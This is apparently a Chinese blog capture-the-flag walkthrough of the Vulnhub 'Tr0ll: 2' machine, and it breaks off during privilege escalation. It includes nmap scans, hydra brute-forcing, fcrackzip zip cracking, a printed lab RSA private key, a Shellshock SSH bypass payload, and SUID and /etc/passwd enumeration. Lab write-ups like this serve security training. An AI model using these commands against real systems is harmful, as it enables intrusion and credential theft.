{"pageProps":{"postData":{"id":"VulnhubTr0ll 2 half","contentHtml":"<h1>Tr0ll: 2 half</h1>\n<blockquote>\n<p><a href=\"https://www.vulnhub.com/entry/tr0ll-2,107/\">https://www.vulnhub.com/entry/tr0ll-2,107/</a></p>\n</blockquote>\n<h2>主机发现端口扫描</h2>\n<ol>\n<li>\n<p>探测存活主机，<code>155</code>为靶机</p>\n<pre><code class=\"hljs language-php\">nmap -sP <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.0</span>/<span class=\"hljs-number\">24</span>\n<span class=\"hljs-comment\">//</span>\nStarting Nmap <span class=\"hljs-number\">7.93</span> ( https:<span class=\"hljs-comment\">//nmap.org ) at 2024-09-27 11:02 CST</span>\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.1</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.00042</span>s latency).\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">50</span>:<span class=\"hljs-number\">56</span>:C0:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">08</span> (VMware)\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.2</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.00053</span>s latency).\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">50</span>:<span class=\"hljs-number\">56</span>:FB:CA:<span class=\"hljs-number\">45</span> (VMware)\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.155</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.00018</span>s latency).\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">0</span>C:<span class=\"hljs-number\">29</span>:F7:<span class=\"hljs-number\">66</span>:<span class=\"hljs-number\">43</span> (VMware)\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.254</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.00022</span>s latency).\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">50</span>:<span class=\"hljs-number\">56</span>:FB:E7:<span class=\"hljs-title function_ invoke__\">F4</span> (VMware)\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.151</span>\nHost is up.\n</code></pre>\n</li>\n<li>\n<p>扫描主机所有端口</p>\n<pre><code class=\"hljs language-php\">nmap -sT -min-rate <span class=\"hljs-number\">10000</span> -p- <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.155</span>\n<span class=\"hljs-comment\">//</span>\nStarting Nmap <span class=\"hljs-number\">7.93</span> ( https:<span class=\"hljs-comment\">//nmap.org ) at 2024-09-27 11:07 CST</span>\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.155</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.013</span>s latency).\nNot shown: <span class=\"hljs-number\">65532</span> closed tcp <span class=\"hljs-title function_ invoke__\">ports</span> (conn-refused)\nPORT   STATE SERVICE\n<span class=\"hljs-number\">21</span>/tcp open  ftp\n<span class=\"hljs-number\">22</span>/tcp open  ssh\n<span class=\"hljs-number\">80</span>/tcp open  http\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">0</span>C:<span class=\"hljs-number\">29</span>:F7:<span class=\"hljs-number\">66</span>:<span class=\"hljs-number\">43</span> (VMware)\n</code></pre>\n</li>\n<li>\n<p>扫描服务版本及系统版本</p>\n<pre><code class=\"hljs language-php\">nmap -sT -sV -O -p21,<span class=\"hljs-number\">22</span>,<span class=\"hljs-number\">80</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.155</span>\n<span class=\"hljs-comment\">//</span>\nStarting Nmap <span class=\"hljs-number\">7.93</span> ( https:<span class=\"hljs-comment\">//nmap.org ) at 2024-09-27 11:10 CST</span>\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.155</span>\nHost is <span class=\"hljs-title function_ invoke__\">up</span> (<span class=\"hljs-number\">0.00054</span>s latency).\n\nPORT   STATE SERVICE VERSION\n<span class=\"hljs-number\">21</span>/tcp open  ftp     vsftpd <span class=\"hljs-number\">2.0</span>.<span class=\"hljs-number\">8</span> <span class=\"hljs-keyword\">or</span> later\n<span class=\"hljs-number\">22</span>/tcp open  ssh     OpenSSH <span class=\"hljs-number\">5.9</span>p1 Debian <span class=\"hljs-number\">5</span>ubuntu1.<span class=\"hljs-number\">4</span> (Ubuntu Linux; protocol <span class=\"hljs-number\">2.0</span>)\n<span class=\"hljs-number\">80</span>/tcp open  http    Apache httpd <span class=\"hljs-number\">2.2</span>.<span class=\"hljs-number\">22</span> ((Ubuntu))\nMAC Address: <span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">0</span>C:<span class=\"hljs-number\">29</span>:F7:<span class=\"hljs-number\">66</span>:<span class=\"hljs-number\">43</span> (VMware)\nWarning: OSScan results may be unreliable because we could not find at least <span class=\"hljs-number\">1</span> open <span class=\"hljs-keyword\">and</span> <span class=\"hljs-number\">1</span> closed port\nDevice type: general purpose\nRunning: Linux <span class=\"hljs-number\">2.6</span>.X|<span class=\"hljs-number\">3</span>.X\nOS CPE: cpe:/o:linux:linux_kernel:<span class=\"hljs-number\">2.6</span> cpe:/o:linux:linux_kernel:<span class=\"hljs-number\">3</span>\nOS details: Linux <span class=\"hljs-number\">2.6</span>.<span class=\"hljs-number\">32</span> - <span class=\"hljs-number\">3.10</span>\nNetwork Distance: <span class=\"hljs-number\">1</span> hop\nService Info: Host: Tr0ll; OS: Linux; CPE: cpe:/o:linux:linux_kernel\n</code></pre>\n</li>\n<li>\n<p>扫描漏洞</p>\n<pre><code class=\"hljs language-sql\">nmap <span class=\"hljs-operator\">-</span>script<span class=\"hljs-operator\">=</span>vuln <span class=\"hljs-operator\">-</span>p22,<span class=\"hljs-number\">21</span>,<span class=\"hljs-number\">80</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.155</span>\n<span class=\"hljs-operator\">/</span><span class=\"hljs-operator\">/</span>\nStarting Nmap <span class=\"hljs-number\">7.93</span> ( https:<span class=\"hljs-operator\">/</span><span class=\"hljs-operator\">/</span>nmap.org ) <span class=\"hljs-keyword\">at</span> <span class=\"hljs-number\">2024</span><span class=\"hljs-number\">-09</span><span class=\"hljs-number\">-27</span> <span class=\"hljs-number\">11</span>:<span class=\"hljs-number\">10</span> CST\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.155</span>\nHost <span class=\"hljs-keyword\">is</span> up (<span class=\"hljs-number\">0.00039</span>s latency).\n\nPORT   STATE SERVICE\n<span class=\"hljs-number\">21</span><span class=\"hljs-operator\">/</span>tcp <span class=\"hljs-keyword\">open</span>  ftp\n<span class=\"hljs-number\">22</span><span class=\"hljs-operator\">/</span>tcp <span class=\"hljs-keyword\">open</span>  ssh\n<span class=\"hljs-number\">80</span><span class=\"hljs-operator\">/</span>tcp <span class=\"hljs-keyword\">open</span>  http\n<span class=\"hljs-operator\">|</span>_http<span class=\"hljs-operator\">-</span>stored<span class=\"hljs-operator\">-</span>xss: Couldn<span class=\"hljs-string\">'t find any stored XSS vulnerabilities.\n|_http-dombased-xss: Couldn'</span>t find <span class=\"hljs-keyword\">any</span> DOM based XSS.\n<span class=\"hljs-operator\">|</span> http<span class=\"hljs-operator\">-</span>enum: \n<span class=\"hljs-operator\">|</span>_  <span class=\"hljs-operator\">/</span>robots.txt: Robots file\n<span class=\"hljs-operator\">|</span>_http<span class=\"hljs-operator\">-</span>csrf: Couldn<span class=\"hljs-string\">'t find any CSRF vulnerabilities.\nMAC Address: 00:0C:29:F7:66:43 (VMware)\n</span></code></pre>\n</li>\n</ol>\n<h2>FTP - 1</h2>\n<ol>\n<li>尝试了anonymous，发现没启动匿名登陆</li>\n</ol>\n<h2>web</h2>\n<ol>\n<li>\n<p>访问主页，有一张图片（Trollface，才知道靶机命名是以这个来的），内容：<code>ME AGAIN LOL</code> 。。</p>\n<p>F12打开有文字 <code>Nothing here, Try Harder!>&#x3C;!--Author: Tr0ll>&#x3C;!--Editor: VIM></code></p>\n</li>\n<li>\n<p><code>nmap</code>扫描出了<code>robots.txt</code> ,尝试访问，是一些目录</p>\n<pre><code class=\"hljs language-sql\"><span class=\"hljs-keyword\">User</span><span class=\"hljs-operator\">-</span>agent:<span class=\"hljs-operator\">*</span>\nDisallow:\n<span class=\"hljs-operator\">/</span>noob\n<span class=\"hljs-operator\">/</span>nope\n<span class=\"hljs-operator\">/</span>try_harder\n<span class=\"hljs-operator\">/</span>keep_trying\n<span class=\"hljs-operator\">/</span>isnt_this_annoying\n<span class=\"hljs-operator\">/</span>nothing_here\n<span class=\"hljs-operator\">/</span><span class=\"hljs-number\">404</span>\n<span class=\"hljs-operator\">/</span>LOL_at_the_last_one\n<span class=\"hljs-operator\">/</span>trolling_is_fun\n<span class=\"hljs-operator\">/</span>zomg_is_this_it\n<span class=\"hljs-operator\">/</span>you_found_me\n<span class=\"hljs-operator\">/</span>I_know_this_sucks\n<span class=\"hljs-operator\">/</span>You_could_give_up\n<span class=\"hljs-operator\">/</span>dont_bother\n<span class=\"hljs-operator\">/</span>will_it_ever_end\n<span class=\"hljs-operator\">/</span>I_hope_you_scripted_this\n<span class=\"hljs-operator\">/</span>ok_this_is_it\n<span class=\"hljs-operator\">/</span>stop_whining\n<span class=\"hljs-operator\">/</span>why_are_you_still_looking\n<span class=\"hljs-operator\">/</span>just_quit\n<span class=\"hljs-operator\">/</span>seriously_stop\n</code></pre>\n<p>只有 <code>/noob ,/dont_bother, /keep_trying</code> 存在照片，一样的照片，均使用binwalk分离没分离出文件，下载<code>/dont_bother</code> 里的照片使用<code>010editor</code>打开，翻到最下面发现文字</p>\n<pre><code class=\"hljs language-sql\">Look Deep <span class=\"hljs-keyword\">within</span> y0ur_self <span class=\"hljs-keyword\">for</span> the answer\n</code></pre>\n<p>什么车轱辘话，我看这个<code>y0ur_self</code>就很不对劲，访问果然，存在<code>answer.txt</code> ，里面的内容是好多好多的base64编码</p>\n</li>\n<li>\n<p><code>answer.txt</code> 看着像是要我们fuzz，我们首先将base64解码保存为<code>fuzz.txt</code>然后对主页进行<code>fuzz</code> ，无结果</p>\n<pre><code class=\"hljs language-sql\">base64 <span class=\"hljs-operator\">-</span>d answer.txt <span class=\"hljs-operator\">></span> fuzz.txt\n\nwfuzz <span class=\"hljs-operator\">-</span>c <span class=\"hljs-operator\">-</span>w fuzz.txt <span class=\"hljs-comment\">--hh 110 http://192.168.75.155/?FUZZ=som</span>\n</code></pre>\n</li>\n</ol>\n<h2>爆破</h2>\n<p>尝试<code>hydra</code>爆破<code>ftp</code></p>\n<pre><code class=\"hljs language-sql\">hydra <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.155</span> <span class=\"hljs-operator\">-</span>s <span class=\"hljs-number\">21</span> ftp <span class=\"hljs-operator\">-</span>L fuzz.txt <span class=\"hljs-operator\">-</span>P fuzz.txt <span class=\"hljs-operator\">-</span>V\n</code></pre>\n<p>完全爆破不出来呢</p>\n<p>尝试弱口令 <code>tr0ll</code>   ，登陆成功。。</p>\n<h2>FTP - 2</h2>\n<ol>\n<li>\n<p>目录下有一个<code>lmao.zip</code>的压缩包，下载，解压需要密码，可能是上面的密码本</p>\n</li>\n<li>\n<p>使用<code>fcrackzip</code> 查看帮助编写命令</p>\n<pre><code class=\"hljs language-sql\">fcrackzip <span class=\"hljs-operator\">-</span>u <span class=\"hljs-operator\">-</span>D <span class=\"hljs-operator\">-</span>p fuzz.txt lmao.zip\n\nPASSWORD FOUND<span class=\"hljs-operator\">!</span><span class=\"hljs-operator\">!</span><span class=\"hljs-operator\">!</span><span class=\"hljs-operator\">!</span>: pw <span class=\"hljs-operator\">=</span><span class=\"hljs-operator\">=</span> ItCantReallyBeThisEasyRightLOL\n</code></pre>\n<p>破解成功的到密码<code>ItCantReallyBeThisEasyRightLOL</code></p>\n</li>\n<li>\n<p>解压后得到文件<code>noob</code> ，是个RSA私钥</p>\n<pre><code class=\"hljs language-sql\"><span class=\"hljs-comment\">-----BEGIN RSA PRIVATE KEY-----</span>\nMIIEpAIBAAKCAQEAsIthv5CzMo5v663EMpilasuBIFMiftzsr<span class=\"hljs-operator\">+</span>w<span class=\"hljs-operator\">+</span>UFe9yFhAoLqq\nyDSPjrmPsyFePcpHmwWEdeR5AWIv<span class=\"hljs-operator\">/</span>RmGZh0Q<span class=\"hljs-operator\">+</span>Qh6vSPswix7<span class=\"hljs-operator\">/</span><span class=\"hljs-operator\">/</span>SnX<span class=\"hljs-operator\">/</span>QHvh0CGhf1\n<span class=\"hljs-operator\">/</span><span class=\"hljs-number\">9</span>zwtJSMely5oCGOujMLjDZjryu1PKxET1CcUpiylr2kgD<span class=\"hljs-operator\">/</span>fy11Th33KwmcsgnPo\nq<span class=\"hljs-operator\">+</span>pMbCh86IzNBEXrBdkYCn222djBaq<span class=\"hljs-operator\">+</span>mEjvfqIXWQYBlZ3HNZ4LVtG<span class=\"hljs-operator\">+</span><span class=\"hljs-number\">5</span>in9bvkU5\nz<span class=\"hljs-operator\">+</span><span class=\"hljs-number\">13</span>lsTpA9px6YIbyrPMMFzcOrxNdpTY86ozw02<span class=\"hljs-operator\">+</span>MmFaYfMxyj2GbLej0<span class=\"hljs-operator\">+</span>qniwKy\ne5SsF<span class=\"hljs-operator\">+</span>eNBRKdqvSYtsVE11SwQmF4imdJO0buvQIDAQABAoIBAA8ltlpQWP<span class=\"hljs-operator\">+</span>yduna\nu<span class=\"hljs-operator\">+</span>W3cSHrmgWi<span class=\"hljs-operator\">/</span>Ge0Ht6tP193V8IzyD<span class=\"hljs-operator\">/</span>CJFsPH24Yf7rX1xUoIOKtI4NV<span class=\"hljs-operator\">+</span>gfjW8i0\ngvKJ9eXYE2fdCDhUxsLcQ<span class=\"hljs-operator\">+</span>wYrP1j0cVZXvL4CvMDd9Yb1JVnq65QKOJ73CuwbVlq\nUmYXvYHcth324YFbeaEiPcN3SIlLWms0pdA71Lc8kYKfgUK8UQ9Q3u58Ehlxv079\nLa35u5VH7GSKeey72655A<span class=\"hljs-operator\">+</span>t6d1ZrrnjaRXmaec<span class=\"hljs-operator\">/</span>j3Kvse2GrXJFhZ2IEDAfa0GXR\nxgl4PyN8O0L<span class=\"hljs-operator\">+</span>TgBNI<span class=\"hljs-operator\">/</span><span class=\"hljs-number\">5</span>nnTSQqbjUiu<span class=\"hljs-operator\">+</span>aOoRCs0856EEpfnGte41AppO99hdPTAKP\naq<span class=\"hljs-operator\">/</span>r7<span class=\"hljs-operator\">+</span>UCgYEA17OaQ69KGRdvNRNvRo4abtiKVFSSqCKMasiL6aZ8NIqNfIVTMtTW\nK<span class=\"hljs-operator\">+</span>WPmz657n1oapaPfkiMRhXBCLjR7HHLeP5RaDQtOrNBfPSi7AlTPrRxDPQUxyxx\nn48iIflln6u85KYEjQbHHkA3MdJBX2yYFp<span class=\"hljs-operator\">/</span>w6pYtKfp15BDA8s4v9HMCgYEA0YcB\nTEJvcW1XUT93ZsN<span class=\"hljs-operator\">+</span>lOo<span class=\"hljs-operator\">/</span>xlXDsf<span class=\"hljs-operator\">+</span><span class=\"hljs-number\">9</span>Njrci<span class=\"hljs-operator\">+</span>G8l7jJEAFWptb<span class=\"hljs-operator\">/</span><span class=\"hljs-number\">9</span>ELc8phiZUHa2dIh\nWBpYEanp2r<span class=\"hljs-operator\">+</span>fKEQwLtoihstceSamdrLsskPhA4xF3zc3c1ubJOUfsJBfbwhX1tQv\nibsKq9kucenZOnT<span class=\"hljs-operator\">/</span>WU8L51Ni5lTJa4HTQwQe9A8CgYEAidHV1T1g6NtSUOVUCg6t\n<span class=\"hljs-number\">0</span>PlGmU9YTVmVwnzU<span class=\"hljs-operator\">+</span>LtJTQDiGhfN6wKWvYF12kmf30P9vWzpzlRoXDd2GS6N4rdq\nvKoyNZRw<span class=\"hljs-operator\">+</span>bqjM0XT<span class=\"hljs-operator\">+</span><span class=\"hljs-number\">2</span>CR8dS1DwO9au14w<span class=\"hljs-operator\">+</span>xecLq7NeQzUxzId5tHCosZORoQbvoh\nywLymdDOlq3TOZ<span class=\"hljs-operator\">+</span>CySD4<span class=\"hljs-operator\">/</span>wUCgYEAr<span class=\"hljs-operator\">/</span>ybRHhQro7OVnneSjxNp7qRUn9a3bkWLeSG\nth8mjrEwf<span class=\"hljs-operator\">/</span>b<span class=\"hljs-operator\">/</span><span class=\"hljs-number\">1</span>yai2YEHn<span class=\"hljs-operator\">+</span>QKUU5dCbOLOjr2We<span class=\"hljs-operator\">/</span>Dcm6cue98IP4rHdjVlRS3oN9s\nG9cTui0pyvDP7F63Eug4E89PuSziyphyTVcDAZBriFaIlKcMivDv6J6LZTc17sye\nq51celUCgYAKE153nmgLIZjw6<span class=\"hljs-operator\">+</span>FQcGYUl5FGfStUY05sOh8kxwBBGHW4<span class=\"hljs-operator\">/</span>fC77<span class=\"hljs-operator\">+</span><span class=\"hljs-keyword\">NO</span>\nvW6CYeE<span class=\"hljs-operator\">+</span>bA2AQmiIGj5CqlNyecZ08j4Ot<span class=\"hljs-operator\">/</span>W3IiRlkobhO07p3nj601d<span class=\"hljs-operator\">+</span>OgTjjgKG\nzp8XZNG8Xwnd5K59AVXZeiLe2LGeYbUKGbHyKE3wEVTTEmgaxF4D1g<span class=\"hljs-operator\">=</span><span class=\"hljs-operator\">=</span>\n<span class=\"hljs-comment\">-----END RSA PRIVATE KEY----- </span>\n</code></pre>\n</li>\n<li>\n<p>是通过RSA私钥登录ssh？</p>\n</li>\n</ol>\n<h2>SSH</h2>\n<ol>\n<li>\n<p>尝试使用RSA登录</p>\n<p>ps：假如遇到<code>sign_and_send_pubkey: no mutual signature supported</code>，在<code>~/.ssh/config</code> 里面添加<code>PubkeyAcceptedKeyTypes +ssh-rsa</code> 即可</p>\n<pre><code class=\"hljs language-sql\">sh <span class=\"hljs-operator\">-</span>i noob noob<span class=\"hljs-variable\">@192</span><span class=\"hljs-number\">.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.155</span>                                                       \nTRY HARDER LOL<span class=\"hljs-operator\">!</span>\nConnection <span class=\"hljs-keyword\">to</span> <span class=\"hljs-number\">192.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.155</span> closed.\n</code></pre>\n<p>依旧不行，不会了，查看WP说是要使用<code>shellshock</code></p>\n<blockquote>\n<p><a href=\"https://xz.aliyun.com/t/14742?time__1311=GqAh7Iq%2Box%2FD7830%3DDOIm3AKRlgxRrbD&#x26;u_atoken=9f3a46244095314eb0a9c855b3b8ffef&#x26;u_asig=0a472f9117274258401631677e0067#toc-6\">https://xz.aliyun.com/t/14742</a></p>\n</blockquote>\n<pre><code class=\"hljs language-sql\">ssh  noob<span class=\"hljs-variable\">@192</span><span class=\"hljs-number\">.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.155</span> <span class=\"hljs-operator\">-</span>i noob <span class=\"hljs-operator\">-</span>t <span class=\"hljs-string\">'() { :;}; /bin/bash'</span>\n</code></pre>\n<p>会变为<code>↓</code>系统误当<code>() { :;};</code> 为函数环境变量</p>\n<pre><code class=\"hljs language-sql\">() { :;};  <span class=\"hljs-operator\">/</span><span class=\"hljs-operator\">/</span> 空函数\n<span class=\"hljs-operator\">/</span>bin<span class=\"hljs-operator\">/</span>bash\n</code></pre>\n<p>输入后得到<code>shell</code></p>\n</li>\n</ol>\n<h2>提权</h2>\n<ol>\n<li>\n<p>查看权限</p>\n<pre><code class=\"hljs language-sql\">ssh  noob<span class=\"hljs-variable\">@192</span><span class=\"hljs-number\">.168</span><span class=\"hljs-number\">.75</span><span class=\"hljs-number\">.155</span> <span class=\"hljs-operator\">-</span>i noob <span class=\"hljs-string\">'() { :;}; /bin/bash'</span>    \n<span class=\"hljs-operator\">/</span><span class=\"hljs-operator\">/</span>                                                                               \npython <span class=\"hljs-operator\">-</span>c <span class=\"hljs-string\">'import pty;pty.spawn(\"/bin/bash\")'</span>\n<span class=\"hljs-operator\">/</span><span class=\"hljs-operator\">/</span>\nnoob<span class=\"hljs-variable\">@Tr0ll2</span>:<span class=\"hljs-operator\">~</span>$ whoami\nnoob\n<span class=\"hljs-operator\">/</span><span class=\"hljs-operator\">/</span>\nnoob<span class=\"hljs-variable\">@Tr0ll2</span>:<span class=\"hljs-operator\">~</span>$ uname <span class=\"hljs-operator\">-</span>a\nLinux Tr0ll2 <span class=\"hljs-number\">3.2</span><span class=\"hljs-number\">.0</span><span class=\"hljs-number\">-29</span><span class=\"hljs-operator\">-</span>generic<span class=\"hljs-operator\">-</span>pae #<span class=\"hljs-number\">46</span><span class=\"hljs-operator\">-</span>Ubuntu SMP Fri Jul <span class=\"hljs-number\">27</span> <span class=\"hljs-number\">17</span>:<span class=\"hljs-number\">25</span>:<span class=\"hljs-number\">43</span> UTC <span class=\"hljs-number\">2012</span> i686 i686 i386 GNU<span class=\"hljs-operator\">/</span>Linux\n</code></pre>\n</li>\n<li>\n<p>枚举信息</p>\n<pre><code class=\"hljs language-sql\">noob<span class=\"hljs-variable\">@Tr0ll2</span>:<span class=\"hljs-operator\">~</span>$ find <span class=\"hljs-operator\">/</span> <span class=\"hljs-operator\">-</span>perm <span class=\"hljs-operator\">-</span>u<span class=\"hljs-operator\">=</span>s <span class=\"hljs-operator\">-</span>type f <span class=\"hljs-number\">2</span><span class=\"hljs-operator\">></span><span class=\"hljs-operator\">/</span>dev<span class=\"hljs-operator\">/</span><span class=\"hljs-keyword\">null</span>\n<span class=\"hljs-operator\">/</span>bin<span class=\"hljs-operator\">/</span>su\n<span class=\"hljs-operator\">/</span>bin<span class=\"hljs-operator\">/</span>umount\n<span class=\"hljs-operator\">/</span>bin<span class=\"hljs-operator\">/</span>ping\n<span class=\"hljs-operator\">/</span>bin<span class=\"hljs-operator\">/</span>mount\n<span class=\"hljs-operator\">/</span>bin<span class=\"hljs-operator\">/</span>fusermount\n<span class=\"hljs-operator\">/</span>bin<span class=\"hljs-operator\">/</span>ping6\n<span class=\"hljs-operator\">/</span>usr<span class=\"hljs-operator\">/</span>bin<span class=\"hljs-operator\">/</span>chfn\n<span class=\"hljs-operator\">/</span>usr<span class=\"hljs-operator\">/</span>bin<span class=\"hljs-operator\">/</span><span class=\"hljs-keyword\">at</span>\n<span class=\"hljs-operator\">/</span>usr<span class=\"hljs-operator\">/</span>bin<span class=\"hljs-operator\">/</span>newgrp\n<span class=\"hljs-operator\">/</span>usr<span class=\"hljs-operator\">/</span>bin<span class=\"hljs-operator\">/</span>sudoedit\n<span class=\"hljs-operator\">/</span>usr<span class=\"hljs-operator\">/</span>bin<span class=\"hljs-operator\">/</span>passwd\n<span class=\"hljs-operator\">/</span>usr<span class=\"hljs-operator\">/</span>bin<span class=\"hljs-operator\">/</span>mtr\n<span class=\"hljs-operator\">/</span>usr<span class=\"hljs-operator\">/</span>bin<span class=\"hljs-operator\">/</span>sudo\n<span class=\"hljs-operator\">/</span>usr<span class=\"hljs-operator\">/</span>bin<span class=\"hljs-operator\">/</span>chsh\n<span class=\"hljs-operator\">/</span>usr<span class=\"hljs-operator\">/</span>bin<span class=\"hljs-operator\">/</span>traceroute6.iputils\n<span class=\"hljs-operator\">/</span>usr<span class=\"hljs-operator\">/</span>bin<span class=\"hljs-operator\">/</span>gpasswd\n<span class=\"hljs-operator\">/</span>usr<span class=\"hljs-operator\">/</span>sbin<span class=\"hljs-operator\">/</span>pppd\n<span class=\"hljs-operator\">/</span>usr<span class=\"hljs-operator\">/</span>sbin<span class=\"hljs-operator\">/</span>uuidd\n<span class=\"hljs-operator\">/</span>usr<span class=\"hljs-operator\">/</span>lib<span class=\"hljs-operator\">/</span>eject<span class=\"hljs-operator\">/</span>dmcrypt<span class=\"hljs-operator\">-</span><span class=\"hljs-keyword\">get</span><span class=\"hljs-operator\">-</span>device\n<span class=\"hljs-operator\">/</span>usr<span class=\"hljs-operator\">/</span>lib<span class=\"hljs-operator\">/</span>vmware<span class=\"hljs-operator\">-</span>tools<span class=\"hljs-operator\">/</span>bin32<span class=\"hljs-operator\">/</span>vmware<span class=\"hljs-operator\">-</span><span class=\"hljs-keyword\">user</span><span class=\"hljs-operator\">-</span>suid<span class=\"hljs-operator\">-</span>wrapper\n<span class=\"hljs-operator\">/</span>usr<span class=\"hljs-operator\">/</span>lib<span class=\"hljs-operator\">/</span>vmware<span class=\"hljs-operator\">-</span>tools<span class=\"hljs-operator\">/</span>bin64<span class=\"hljs-operator\">/</span>vmware<span class=\"hljs-operator\">-</span><span class=\"hljs-keyword\">user</span><span class=\"hljs-operator\">-</span>suid<span class=\"hljs-operator\">-</span>wrapper\n<span class=\"hljs-operator\">/</span>usr<span class=\"hljs-operator\">/</span>lib<span class=\"hljs-operator\">/</span>pt_chown\n<span class=\"hljs-operator\">/</span>usr<span class=\"hljs-operator\">/</span>lib<span class=\"hljs-operator\">/</span>dbus<span class=\"hljs-number\">-1.0</span><span class=\"hljs-operator\">/</span>dbus<span class=\"hljs-operator\">-</span>daemon<span class=\"hljs-operator\">-</span>launch<span class=\"hljs-operator\">-</span>helper\n<span class=\"hljs-operator\">/</span>usr<span class=\"hljs-operator\">/</span>lib<span class=\"hljs-operator\">/</span>openssh<span class=\"hljs-operator\">/</span>ssh<span class=\"hljs-operator\">-</span>keysign\n<span class=\"hljs-operator\">/</span>nothing_to_see_here<span class=\"hljs-operator\">/</span>choose_wisely<span class=\"hljs-operator\">/</span>door2<span class=\"hljs-operator\">/</span>r00t\n<span class=\"hljs-operator\">/</span>nothing_to_see_here<span class=\"hljs-operator\">/</span>choose_wisely<span class=\"hljs-operator\">/</span>door3<span class=\"hljs-operator\">/</span>r00t\n<span class=\"hljs-operator\">/</span>nothing_to_see_here<span class=\"hljs-operator\">/</span>choose_wisely<span class=\"hljs-operator\">/</span>door1<span class=\"hljs-operator\">/</span>r00t\n<span class=\"hljs-operator\">/</span><span class=\"hljs-operator\">/</span>\nnoob<span class=\"hljs-variable\">@Tr0ll2</span>:<span class=\"hljs-operator\">~</span>$ cat <span class=\"hljs-operator\">/</span>etc<span class=\"hljs-operator\">/</span>passwd\nroot:x:<span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">0</span>:root:<span class=\"hljs-operator\">/</span>root:<span class=\"hljs-operator\">/</span>bin<span class=\"hljs-operator\">/</span>bash\ndaemon:x:<span class=\"hljs-number\">1</span>:<span class=\"hljs-number\">1</span>:daemon:<span class=\"hljs-operator\">/</span>usr<span class=\"hljs-operator\">/</span>sbin:<span class=\"hljs-operator\">/</span>bin<span class=\"hljs-operator\">/</span>sh\nbin:x:<span class=\"hljs-number\">2</span>:<span class=\"hljs-number\">2</span>:bin:<span class=\"hljs-operator\">/</span>bin:<span class=\"hljs-operator\">/</span>bin<span class=\"hljs-operator\">/</span>sh\nsys:x:<span class=\"hljs-number\">3</span>:<span class=\"hljs-number\">3</span>:sys:<span class=\"hljs-operator\">/</span>dev:<span class=\"hljs-operator\">/</span>bin<span class=\"hljs-operator\">/</span>sh\nsync:x:<span class=\"hljs-number\">4</span>:<span class=\"hljs-number\">65534</span>:sync:<span class=\"hljs-operator\">/</span>bin:<span class=\"hljs-operator\">/</span>bin<span class=\"hljs-operator\">/</span>sync\ngames:x:<span class=\"hljs-number\">5</span>:<span class=\"hljs-number\">60</span>:games:<span class=\"hljs-operator\">/</span>usr<span class=\"hljs-operator\">/</span>games:<span class=\"hljs-operator\">/</span>bin<span class=\"hljs-operator\">/</span>sh\nman:x:<span class=\"hljs-number\">6</span>:<span class=\"hljs-number\">12</span>:man:<span class=\"hljs-operator\">/</span>var<span class=\"hljs-operator\">/</span>cache<span class=\"hljs-operator\">/</span>man:<span class=\"hljs-operator\">/</span>bin<span class=\"hljs-operator\">/</span>sh\nlp:x:<span class=\"hljs-number\">7</span>:<span class=\"hljs-number\">7</span>:lp:<span class=\"hljs-operator\">/</span>var<span class=\"hljs-operator\">/</span>spool<span class=\"hljs-operator\">/</span>lpd:<span class=\"hljs-operator\">/</span>bin<span class=\"hljs-operator\">/</span>sh\nmail:x:<span class=\"hljs-number\">8</span>:<span class=\"hljs-number\">8</span>:mail:<span class=\"hljs-operator\">/</span>var<span class=\"hljs-operator\">/</span>mail:<span class=\"hljs-operator\">/</span>bin<span class=\"hljs-operator\">/</span>sh\nnews:x:<span class=\"hljs-number\">9</span>:<span class=\"hljs-number\">9</span>:news:<span class=\"hljs-operator\">/</span>var<span class=\"hljs-operator\">/</span>spool<span class=\"hljs-operator\">/</span>news:<span class=\"hljs-operator\">/</span>bin<span class=\"hljs-operator\">/</span>sh\nuucp:x:<span class=\"hljs-number\">10</span>:<span class=\"hljs-number\">10</span>:uucp:<span class=\"hljs-operator\">/</span>var<span class=\"hljs-operator\">/</span>spool<span class=\"hljs-operator\">/</span>uucp:<span class=\"hljs-operator\">/</span>bin<span class=\"hljs-operator\">/</span>sh\nproxy:x:<span class=\"hljs-number\">13</span>:<span class=\"hljs-number\">13</span>:proxy:<span class=\"hljs-operator\">/</span>bin:<span class=\"hljs-operator\">/</span>bin<span 